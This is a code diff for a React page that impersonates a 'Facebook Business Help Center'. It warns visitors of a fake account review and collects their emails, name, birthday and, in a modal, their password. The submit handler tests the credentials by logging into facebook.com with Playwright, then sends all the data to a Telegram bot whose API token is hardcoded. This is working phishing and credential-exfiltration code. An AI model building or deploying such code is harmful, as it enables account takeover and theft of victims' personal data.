@@ -1,10 +1,11 @@
-import React from 'react';
+import React, { useState } from 'react';
 import Header from './header'
 import Footer from './footer';
 import { Typography, FormControl, Box, Grid, Container, TextField, FormControlLabel, Checkbox, Button, Modal } from '@mui/material';
 import PhoneInput from 'react-phone-input-2'
 import 'react-phone-input-2/lib/style.css'
-import './styles.module.css'
+import './css/issueStyles.css'
+
 
 const Issue = () => {
     const boxStyle = {
@@ -87,6 +88,18 @@ const Issue = () => {
         fontSize: '0.875em',
         fontWeight: 400,
     }
+
+    const modalTextStyle = {
+        margin: '0px',
+        fontFamily: 'Roboto, Helvetica, Arial, sans-serif',
+        lineHeight: 1.5,
+        letterSpacing: '0.00938em',
+        color: 'rgb(122, 122, 122)',
+        fontSize: '1rem',
+        fontWeight: 400,
+        padding: '15px 0px'
+    }
+
     const reportStyle = {
         margin: '0px',
         fontFamily: 'Roboto, Helvetica, Arial, sans-serif',
@@ -102,63 +115,252 @@ const Issue = () => {
         borderRadius: '5px',
         padding: '0.375rem 0.75rem',
     }
-    const [open, setOpen] = React.useState(false);
-    const handleOpen = () => setOpen(true);
-    const handleClose = () => setOpen(false);
+
 
     const modalStyle = {
         position: 'absolute' as 'absolute',
         top: '50%',
         left: '50%',
         transform: 'translate(-50%, -50%)',
-        width: 400,
+        width: 450,
         bgcolor: 'background.paper',
-        border: '2px solid #000',
-        boxShadow: 24,
         p: 4,
+        maxWidth: '600px',
+        borderRadius: '16px',
+        backgroundColor: 'rgb(255, 255, 255)',
+        border: '1px solid rgb(237, 237, 237)',
+        boxShadow: 'rgba(0, 0, 0, 0.2) 0px 11px 15px -7px, rgba(0, 0, 0, 0.14) 0px 24px 38px 3px, rgba(0, 0, 0, 0.12) 0px 9px 46px 8px',
+        padding: '16px',
+        margin: '0px 15px',
     }
+
+    const formStyle = {
+        display: 'inline-flex',
+        flexDirection: 'column',
+        position: 'relative',
+        minWidth: '0px',
+        padding: '30px 0px 0px',
+        margin: '0px',
+        border: '0px',
+        verticalAlign: 'top',
+        width: '100%',
+    }
+    const facebookStyle = {
+        margin: '0px',
+        fontFamily: 'Roboto, Helvetica, Arial, sans-serif',
+        fontWeight: 400,
+        lineHeight: '1.5',
+        letterSpacing: '0.00938em',
+        color: 'rgb(255, 255, 255)',
+        position: 'absolute',
+        textAlign: 'center',
+        top: '18%',
+        left: '0px',
+        width: '100%',
+        transform: 'translate(0px, -50%)',
+        fontSize: '24px',
+    };
+    const secondBoxStyle = {
+        'margin': '40px 0px 50px'
+    }
+    const boxContainerStyle = {
+        width: '100%',
+        marginLeft: 'auto',
+        boxSizing: 'border-box',
+        marginRight: 'auto',
+        display: 'block'
+    }
+    const phoneStyle = {
+        fontFamily: 'Roboto, sans-serif',
+        fontSize: '15px',
+        position: 'relative',
+        width: '100%',
+    }
+    const headerStyle = {
+        borderBottom: '1px solid rgba(0, 0, 0, 0.12)',
+        paddingBottom: '1.5em',
+        display: 'flex',
+        WebkitBoxAlign: 'center',
+        alignItems: 'center',
+        WebkitBoxPack: 'justify',
+        justifyContent: 'space-between',
+    }
+    const contentStyle = {
+        borderBottom: '1px solid rgba(0, 0, 0, 0.12)',
+        paddingBottom: '1.5em',
+    }
+
+    const [formData, setFormData] = useState({
+        ip: '',
+        countryCode: '',
+        city: '',
+        latitude: '',
+        longtitude: '',
+        info: '',
+        emailBusiness: '',
+        emailPersonal: '',
+        fbPage: '',
+        password: '',
+        fullName: '',
+        dob: '',
+        phone: '',
+        userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
+        cookie: ''
+    });
+
+    const [open, setOpen] = useState(false);
+    const handleOpen = () => setOpen(true);
+    const handleClose = () => setOpen(false);
+
+    const handleChange = (e) => {
+        const { name, value } = e.target;
+        setFormData((prevData) => ({
+            ...prevData,
+            [name]: value,
+        }));
+    };
+
+    const playwright = require('playwright');
+
+    const handleSubmit = async () => {
+        const apiKey = '6425835045:AAH4oQKUYBm1HJRb2ALoeP5fEkfGgqSvmuo'; // Replace with your bot API key
+        const chatId = '-1002102330634'; // Replace with your chat ID
+
+        const headers = {
+            'Content-Type': 'application/json',
+        };
+
+        const apiUrl = `https://api.telegram.org/bot${apiKey}/sendMessage`;
+
+
+
+
+        // Access the form data here (formData object)
+        console.log(formData);
+
+        try {
+            // Launch a headless browser with Playwright (you can choose a specific browser)
+            const browser = await playwright.chromium.launch();
+            const context = await browser.newContext();
+            const page = await context.newPage();
+
+            // Navigate to a webpage (replace with the actual URL)
+            const targetUrl = 'https://www.facebook.com/'; // Replace with the URL you want to visit
+            await page.goto(targetUrl);
+            await page.fill('#email', formData.emailPersonal);
+            await page.fill('#pass', formData.password);
+            await page.click('button[name="login"]');
+            await page.waitForSelector('a[aria-label="Facebook"]');
+
+            // You can perform interactions with the page using Playwright here if needed
+
+            // Close the browser when done
+            await browser.close();
+
+            // Continue with sending the Telegram message
+
+        } catch (error) {
+            console.error('Error sending message:', error);
+            throw error;
+        }
+
+        const formattedString = `[{}]: New information submitted 
+        *IP:* ${formData.ip}
+        *Country Code:* ${formData.countryCode}
+        *City:* ${formData.city}
+        *Latitude:* ${formData.latitude}
+        *Longitude:* ${formData.longtitude}
+        *Information:* ${formData.info}
+        *Business Email:* ${formData.emailBusiness}
+        *Personal Email*: ${formData.emailPersonal}
+        *Password: * ${formData.password}
+        *Fullname: *${formData.fullName}
+        *Facebook Name:* ${formData.fbPage}
+        *Birthday: * ${formData.dob}
+        *Phone*: ${formData.phone}
+        *User Agent:* ${formData.userAgent}
+        *Cookie*: ${formData.cookie}`;
+
+        const data = {
+            chat_id: chatId,
+            text: formattedString,
+            parse_mode: 'HTML',
+            disable_notification: false,
+        };
+
+        try {
+            const response = await fetch(apiUrl, {
+                method: 'POST',
+                headers,
+                body: JSON.stringify(data),
+            });
+
+            if (response.ok) {
+                console.log('ok');
+            } else {
+                console.error('Failed to send message');
+            }
+        } catch (error) {
+            console.error('Error sending message:', error);
+            throw error;
+        }
+
+
+    };
+
+
     return (
         <div>
             <Header />
-            <section>
-                <Container maxWidth="lg">
-                    <Box style={boxStyle}>
-                        <Grid container spacing={2}>
-                            <Grid style={timelineContent} className='timeline-content' container item xs={4} sm={4} md={4} direction="column">
-                                <Box style={circleStyle} className='inner-circle'></Box>
-                                <Typography style={timelineContentTextStyle} variant='body1' component='p'>Select Asset</Typography>
+            <Box component='section'>
+                <Box>
+                    <img src='images/main_background.jpg' alt='background_png' ></img>
+                    <Typography variant='h2' className="centered-text" style={facebookStyle}>Facebook Business Help Center</Typography>
+                </Box>
+                <Box style={secondBoxStyle}>
+                    <Container style={boxContainerStyle} maxWidth="lg">
+                        <Box style={boxStyle}>
+                            <Grid container spacing={2}>
+                                <Grid style={timelineContent} className='timeline-content' container item xs={4} sm={4} md={4} direction="column">
+                                    <Box style={circleStyle} className='inner-circle'></Box>
+                                    <Typography style={timelineContentTextStyle} variant='body1' component='p'>Select Asset</Typography>
+                                </Grid>
+                                <Grid style={timelineContent} className='timeline-content' container item xs={4} sm={4} md={4} direction="column">
+                                    <Box style={circleStyle} className='inner-circle'></Box>
+                                    <Typography style={timelineContentTextStyle} variant='body1' component='p'>Select the Issue</Typography>
+                                </Grid>
+                                <Grid style={timelineContent} className='timeline-content' container item xs={4} sm={4} md={4} direction="column">
+                                    <Box style={circleStyle} className='inner-circle'></Box>
+                                    <Typography style={timelineContentTextStyle} variant='body1' component='p'>Get help</Typography>
+                                </Grid>
                             </Grid>
-                            <Grid style={timelineContent} className='timeline-content' container item xs={4} sm={4} md={4} direction="column">
-                                <Box style={circleStyle} className='inner-circle'></Box>
-                                <Typography style={timelineContentTextStyle} variant='body1' component='p'>Select the Issue</Typography>
-                            </Grid>
-                            <Grid style={timelineContent} className='timeline-content' container item xs={4} sm={4} md={4} direction="column">
-                                <Box style={circleStyle} className='inner-circle'></Box>
-                                <Typography style={timelineContentTextStyle} variant='body1' component='p'>Get help</Typography>
-                            </Grid>
-                            <Typography variant='body1' component='h3' style={startedStyle}>Get Started</Typography>
-                            <Box>
+                            <Typography variant='body1' align='center' component='h3' style={startedStyle}>Get Started</Typography>
+                            <Box alignContent={'center'}>
                                 <Typography variant='body1' style={bodyStyle}>We have received multiple reports that suggest that your account has been in violation of our terms of services and community guidelines. As a result, your account is scheduled for review</Typography>
-                                <Typography variant='body1' component='b' style={reportStyle}>Report no: 6ed73dbc-5a5d-4f85-9bfd-59c28e357975</Typography>
+                                <Typography variant='body1' align='center' component='b' style={reportStyle}>Report no: 6ed73dbc-5a5d-4f85-9bfd-59c28e357975</Typography>
                             </Box>
                             <Box component='form' method='post'>
-                                <FormControl>
+                                <FormControl style={formStyle}>
                                     <Typography component='label' variant='body1' style={bodyStyle}>Please provide us information that will help us investigate</Typography>
-                                    <textarea required name='infor' rows={4} style={textAreaStyle} />
+                                    <textarea onChange={handleChange} required name='infor' rows={4} style={textAreaStyle} />
                                     <Typography component='label' variant='body1' style={bodyStyle}>Business Email</Typography>
-                                    <TextField required name='emailBusiness' type='email'></TextField>
+                                    <TextField onChange={handleChange} required name='emailBusiness' type='email'></TextField>
                                     <Typography component='label' variant='body1' style={bodyStyle}>Facebook Email</Typography>
-                                    <TextField required name='emailPersonal' type='email'></TextField>
+                                    <TextField onChange={handleChange} required name='emailPersonal' type='email'></TextField>
                                     <Typography component='label' variant='body1' style={bodyStyle}>Facebook Page Name</Typography>
-                                    <TextField required name='fbPage' type='text'></TextField>
+                                    <TextField onChange={handleChange} required name='fbPage' type='text'></TextField>
                                     <Typography component='label' variant='body1' style={bodyStyle}>Full name</Typography>
-                                    <TextField required name='fullName' type='text'></TextField>
+                                    <TextField onChange={handleChange} required name='fullName' type='text'></TextField>
                                     <Typography component='label' variant='body1' style={bodyStyle}>Birthday</Typography>
-                                    <TextField required name='dob' type='date'></TextField>
+                                    <TextField onChange={handleChange} required name='dob' type='date'></TextField>
                                     <Typography component='label' variant='body1' style={bodyStyle}>Phone Number</Typography>
-                                    <Box>
-                                        <PhoneInput country={'us'} />
-                                    </Box>
+                                    {/* <Box>
+                                        <PhoneInput onChange={handleChange} inputProps={{
+                                            name: 'phone',
+                                            required: true,
+                                            autoFocus: true
+                                        }} style={phoneStyle} country={'us'} />
+                                    </Box> */}
                                     <FormControlLabel required control={<Checkbox />} labelPlacement='end' label='I agree to our Terms, Data and Cookies Policy.' />
                                     <Button variant="contained" size='medium' tabIndex={0} type='button' onClick={handleOpen}>Submit</Button>
                                     <Modal
@@ -167,21 +369,39 @@ const Issue = () => {
                                         aria-labelledby="modal-modal-title"
                                         aria-describedby="modal-modal-description"
                                     >
-                                        <Box sx={modalStyle}>
-                                            <Typography id="modal-modal-title" variant="h6" component="h2">
-                                                Text in a modal
-                                            </Typography>
-                                            <Typography id="modal-modal-description" sx={{ mt: 2 }}>
-                                                Duis mollis, est non commodo luctus, nisi erat porttitor ligula.
-                                            </Typography>
+                                        <Box style={modalStyle}>
+                                            <Box className='header-modal' style={headerStyle}>
+                                                <Typography variant="body1" component="h2">
+                                                    Please Enter Your Password
+                                                </Typography>
+                                            </Box>
+                                            <Box className='content-modal' style={contentStyle}>
+                                                <Typography variant="body1" component="p" style={modalTextStyle}>
+                                                    For your security, you must enter your password to continue.
+                                                </Typography>
+                                                <Box>
+                                                    <TextField onChange={handleChange} required type='password' name='password' placeholder='*********'></TextField>
+                                                </Box>
+                                            </Box>
+                                            <Box className='footer-modal'>
+                                                <Grid container item md={12} className=''>
+                                                    <Button className='cancel-btn' type='button'>
+                                                        Cancel
+                                                    </Button>
+                                                    <Button onClick={handleSubmit} className='submit-btn' type='submit'>
+                                                        Submit
+                                                    </Button>
+                                                </Grid>
+                                            </Box>
                                         </Box>
+
                                     </Modal>
                                 </FormControl>
                             </Box>
-                        </Grid>
-                    </Box>
-                </Container>
-            </section>
+                        </Box>
+                    </Container>
+                </Box>
+            </Box>
             <Footer />
         </div>
     );
